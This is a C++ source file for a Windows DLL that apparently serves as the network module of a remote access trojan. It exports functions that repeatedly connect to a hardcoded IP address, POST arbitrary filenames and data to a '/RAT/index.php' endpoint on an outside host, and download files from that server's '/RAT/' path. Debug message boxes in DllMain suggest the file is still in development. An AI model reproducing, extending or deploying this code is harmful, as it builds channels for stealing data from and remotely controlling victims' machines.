//cl /EHsc /LD .\network_lib.cpp /link User32.lib
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <sstream>                                                              // Include for stringstream
#include <mutex>

#pragma comment(lib, "ws2_32.lib")
using namespace std;
#define DLL_EXPORT __declspec(dllexport)

SOCKET clientSocket;
mutex socketMutex; 

int safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);

        clientSocket = INVALID_SOCKET;
        return 0;
    }
    else return 1;
}

int socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else connected = true;

    }
    return 1;
}

DLL_EXPORT int send_data(const string& filename , const string& data)
{
    {
        lock_guard<mutex> lock1(socketMutex); 
        
        if(!socket_setup(clientSocket)) return 1;


        std::stringstream httpRequest;
        httpRequest << "POST /RAT/index.php HTTP/1.1\r\n"
                    << "Host: arth.imbeddex.com\r\n"
                    << "Content-Length: " << (filename.length() + data.length()) << "\r\n"
                    << "Content-Type: application/octet-stream\r\n"
                    << "Connection: close\r\n\r\n"
                    << filename << data;

        std::string requestString = httpRequest.str();
        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);        
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
            return 1;
        }

        if(!safe_closesocket(clientSocket)) return 1;
        return 0;
    }
}

DLL_EXPORT string receive_data(const string &filename)
{
    {
        lock_guard<mutex> lock1(socketMutex);

        socket_setup(clientSocket);

        string f_name = filename;
        std::stringstream httpRequest;
        httpRequest << "GET /RAT/" << f_name << " HTTP/1.1\r\n"
                    << "Host: arth.imbeddex.com\r\n"
                    << "Connection: close\r\n\r\n";

        string requestString = httpRequest.str();
        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            //cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        string receivedData;
        int bytesReceived;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived > 0)
            {
                buffer[bytesReceived] = '\0';
                receivedData += buffer;
            } 
            else if (bytesReceived == 0)
            {
                cerr << "Connection closed by server." << endl;
                break;
            } else
            {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1);

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        // Robust HTTP response parsing
        size_t headerEnd = receivedData.find("\r\n\r\n");
        if (headerEnd == string::npos)
        {
            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
            return "";
        }

        string body = receivedData.substr(headerEnd + 4);

        //Handle chunked transfer encoding (if present)
        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
        if (transferEncodingPos != string::npos)
        {
            string unchunkedBody;
            istringstream bodyStream(body);
            string chunkLengthStr;

            while (getline(bodyStream, chunkLengthStr))
            {
                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;

                size_t chunkSize;
                stringstream ss;
                ss << hex << chunkLengthStr;
                ss >> chunkSize;

                if (chunkSize == 0) break; // End of chunked data

                string chunkData(chunkSize, '\0');
                bodyStream.read(&chunkData[0], chunkSize);

                unchunkedBody += chunkData;
                bodyStream.ignore(2); // Consume CRLF after chunk
            }
            body = unchunkedBody;
        }

        safe_closesocket(clientSocket);
        return body;
    }
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION); 
            break;
        }
        case DLL_PROCESS_DETACH:
        {
            MessageBoxA(NULL, "DLL_PROCESS_DETACH" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
            WSACleanup();
            break;
        }
        case DLL_THREAD_ATTACH:
        {
            MessageBoxA(NULL, "DLL_THREAD_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
            break;
        }
        case DLL_THREAD_DETACH:
        {
            MessageBoxA(NULL, "DLL_THREAD_DETACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
            break;
        }
    }    
    return TRUE;
}